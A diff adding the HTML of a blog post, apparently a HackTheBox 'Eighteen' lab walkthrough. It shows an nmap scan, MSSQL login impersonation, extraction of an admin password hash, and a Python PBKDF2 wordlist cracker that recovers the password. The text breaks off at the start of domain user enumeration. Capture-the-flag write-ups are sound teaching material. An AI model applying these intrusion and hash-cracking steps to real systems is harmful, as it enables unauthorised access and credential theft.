@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/04/12/hackthebox-eighteen/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewEighteen is an easy-difficulty windows machine running a Domain Controller (DC01). We start with MSSQL credentials found during enumeration, pivot through the database to extract a web applica">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Eighteen">
+<meta property="og:url" content="http://fouedsaidi.com/2026/04/12/Hackthebox-Eighteen/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewEighteen is an easy-difficulty windows machine running a Domain Controller (DC01). We start with MSSQL credentials found during enumeration, pivot through the database to extract a web applica">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Eighteen/Eighteen.png">
+<meta property="article:published_time" content="2026-04-12T18:54:29.000Z">
+<meta property="article:modified_time" content="2026-04-12T20:59:22.399Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="MSSQL">
+<meta property="article:tag" content="dMSA">
+<meta property="article:tag" content="Kerberos">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="Password Reuse">
+<meta property="article:tag" content="Ligolo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Eighteen/Eighteen.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Eighteen -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Eighteen</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-12 21:54:29</span>
+        <span class="mobile">2026-04-12 21:54:29</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-12 23:59:22</span>
+            <span class="mobile">2026-04-12 23:59:22</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/HackTheBox/">HackTheBox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/MSSQL/">MSSQL</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dMSA/">dMSA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Kerberos/">Kerberos</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Active-Directory/">Active Directory</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Password-Reuse/">Password Reuse</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Ligolo/">Ligolo</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Eighteen is an easy-difficulty windows machine running a Domain Controller (DC01). We start with MSSQL credentials found during enumeration, pivot through the database to extract a web application admin hash, crack it, and spray the password across domain users to land a WinRM shell. From there, we abuse the <strong>Delegated Managed Service Account (dMSA)</strong> feature introduced in Windows Server 2025 to impersonate the Administrator and perform a DCSync, fully compromising the domain.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Eighteen/Eighteen.png"
+                      alt="Eighteen-info-card"
+                ><figcaption>Eighteen-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We begin with a full port scan using <code>nmap</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">80/tcp   open  http     Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Did not follow redirect to http://eighteen.htb/</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.129.116.222:1433:</span><br><span class="line">|     Target_Name: EIGHTEEN</span><br><span class="line">|     NetBIOS_Domain_Name: EIGHTEEN</span><br><span class="line">|     NetBIOS_Computer_Name: DC01</span><br><span class="line">|     DNS_Domain_Name: eighteen.htb</span><br><span class="line">|     DNS_Computer_Name: DC01.eighteen.htb</span><br><span class="line">|     DNS_Tree_Name: eighteen.htb</span><br><span class="line">|_    Product_Version: 10.0.26100</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.129.116.222:1433:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2022 RTM</span><br><span class="line">|       number: 16.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2022</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">|_ssl-date: 2025-11-19T10:36:21+00:00; +7h00m01s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2025-11-19T03:21:40</span><br><span class="line">|_Not valid after:  2055-11-19T03:21:40</span><br><span class="line">5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   456.07 ms 10.10.16.1</span><br><span class="line">2   456.19 ms 10.129.116.222</span><br></pre></td></tr></table></figure></div>
+
+<p>We have three open ports: <strong>HTTP (80)</strong>, <strong>MSSQL (1433)</strong>, and <strong>WinRM (5985)</strong>. The HTTP redirects to <code>eighteen.htb</code>, so we add it to <code>/etc/hosts</code>. The NTLM info reveals this is <code>DC01.eighteen.htb</code> — a Domain Controller running Windows Server 2025.</p>
+<h2 id="MSSQL-Enumeration"><a href="#MSSQL-Enumeration" class="headerlink" title="MSSQL Enumeration"></a>MSSQL Enumeration</h2><p>We have credentials <code>kevin / iNa2we6haRj2gaw!</code> for the MSSQL service. We connect using <code>impacket-mssqlclient</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-mssqlclient eighteen.htb/kevin:&#x27;iNa2we6haRj2gaw!&#x27;@10.129.116.222</span><br><span class="line">Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC01): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC01): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (kevin  guest@master)&gt; enum_logins</span><br><span class="line">name     type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin</span><br><span class="line">------   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------</span><br><span class="line">sa       SQL_LOGIN             0          1               0             0            0              0           0           0           0</span><br><span class="line">kevin    SQL_LOGIN             0          0               0             0            0              0           0           0           0</span><br><span class="line">appdev   SQL_LOGIN             0          0               0             0            0              0           0           0           0</span><br><span class="line">SQL (kevin  guest@master)&gt; exec_login as appdev</span><br><span class="line">ERROR(DC01): Line 1: Incorrect syntax near the keyword &#x27;as&#x27;.</span><br><span class="line">SQL (kevin  guest@master)&gt; exec_as_login appdev</span><br><span class="line">SQL (appdev  appdev@master)&gt; enum_db</span><br><span class="line">name                is_trustworthy_on</span><br><span class="line">-----------------   -----------------</span><br><span class="line">master                              0</span><br><span class="line">tempdb                              0</span><br><span class="line">model                               0</span><br><span class="line">msdb                                1</span><br><span class="line">financial_planner                   0</span><br><span class="line">SQL (appdev  appdev@master)&gt; use financial_planner</span><br><span class="line">ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner</span><br><span class="line">INFO(DC01): Line 1: Changed database context to &#x27;financial_planner&#x27;.</span><br><span class="line">SQL (appdev  appdev@financial_planner)&gt; select name from sys.tables;</span><br><span class="line">name</span><br><span class="line">-----------</span><br><span class="line">users</span><br><span class="line">incomes</span><br><span class="line">expenses</span><br><span class="line">allocations</span><br><span class="line">analytics</span><br><span class="line">visits</span><br><span class="line">SQL (appdev  appdev@financial_planner)&gt; select * from users;</span><br><span class="line">  id   full_name   username   email                password_hash                                                                                            is_admin   created_at</span><br><span class="line">----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------</span><br><span class="line">1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03</span><br><span class="line">SQL (appdev  appdev@financial_planner)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We enumerate the SQL logins and find an <code>appdev</code> account. Using <code>exec_as_login</code>, we impersonate <code>appdev</code> and discover a <code>financial_planner</code> database containing a <code>users</code> table. We extract the admin password hash — a <code>pbkdf2:sha256</code> hash with 600,000 iterations.</p>
+<h2 id="Cracking-the-Hash"><a href="#Cracking-the-Hash" class="headerlink" title="Cracking the Hash"></a>Cracking the Hash</h2><p>The hash format is Werkzeug’s PBKDF2, commonly used in Flask applications. We write a quick Python cracker:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">$ cat cracker.py</span><br><span class="line">import sys</span><br><span class="line">import hashlib</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">    print(f&quot;Usage: &#123;sys.argv[0]&#125; &lt;wordlist&gt;&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line">wordlist_path = sys.argv[1]</span><br><span class="line"></span><br><span class="line">hash_string = input(&quot;Enter hash (pbkdf2:sha256:ITER$SALT$HEX): &quot;).strip()</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    method_part, salt_str, hash_hex = hash_string.split(&quot;$&quot;)</span><br><span class="line">    algo, digest, iterations_str = method_part.split(&quot;:&quot;)</span><br><span class="line">    iterations = int(iterations_str)</span><br><span class="line">except ValueError:</span><br><span class="line">    print(&quot;[!] Hash format looks wrong. Expected: pbkdf2:sha256:ITERATIONS$SALT$HEX_HASH&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line">salt = salt_str.encode()</span><br><span class="line">target_hash = bytes.fromhex(hash_hex)</span><br><span class="line"></span><br><span class="line">with open(wordlist_path, &quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:</span><br><span class="line">    passwords = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">print(f&quot;[+] Loaded &#123;len(passwords)&#125; passwords from &#123;wordlist_path&#125;&quot;)</span><br><span class="line">print(&quot;[+] Cracking...&quot;)</span><br><span class="line"></span><br><span class="line">found = False</span><br><span class="line"></span><br><span class="line">for pwd in tqdm(passwords, unit=&quot;pwds&quot;):</span><br><span class="line">    derived = hashlib.pbkdf2_hmac(</span><br><span class="line">        &quot;sha256&quot;,</span><br><span class="line">        pwd.encode(),</span><br><span class="line">        salt,</span><br><span class="line">        iterations</span><br><span class="line">    )</span><br><span class="line">    if derived == target_hash:</span><br><span class="line">        print(f&quot;\n[+] Password found: &#123;pwd&#125;&quot;)</span><br><span class="line">        found = True</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">if not found:</span><br><span class="line">    print(&quot;\n[-] Password not found in wordlist.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ python3 cracker.py /usr/share/wordlists/rockyou.txt</span><br><span class="line">Enter hash (pbkdf2:sha256:ITER$SALT$HEX): pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133</span><br><span class="line">[+] Loaded 14344392 passwords from /usr/share/wordlists/rockyou.txt</span><br><span class="line">[+] Cracking...</span><br><span class="line">  0%|                                                                                                                   | 232/14344392 [00:22&lt;384:20:08, 10.37pwds/s]</span><br><span class="line">[+] Password found: iloveyou1</span><br><span class="line">  0%|</span><br></pre></td></tr></table></figure></div>
+
+<p>We crack the hash and recover the password: <code>iloveyou1</code>. We can now log in to the web application at <code>http://eighteen.htb/dashboard</code> with <code>admin:iloveyou1</code>.</p>
+<h2 id="Domain-User-Enumeration"><a href="#Domain-User-Enumeration" class="headerlink" title="Domain User Enumeration"></a>Domain User Enumeration</h2><p>Using the MSSQL access, we perform RID brute-forcing with <code>netexec</code> to enumerate domain users:</p>
